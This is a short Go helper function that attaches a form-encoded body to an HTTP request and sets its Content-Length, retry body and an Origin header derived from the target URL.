func attachBody(tmpl *http.Request, body []byte, targetURL string) {
	tmpl.Body = io.NopCloser(bytes.NewReader(body))
	tmpl.ContentLength = int64(len(body))
	tmpl.GetBody = func() (io.ReadCloser, error) {
		return io.NopCloser(bytes.NewReader(body)), nil
	}
	tmpl.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if u, err := url.Parse(targetURL); err == nil && u.Host != "" {
		tmpl.Header.Set("Origin", u.Scheme+"://"+u.Host)
	}
}
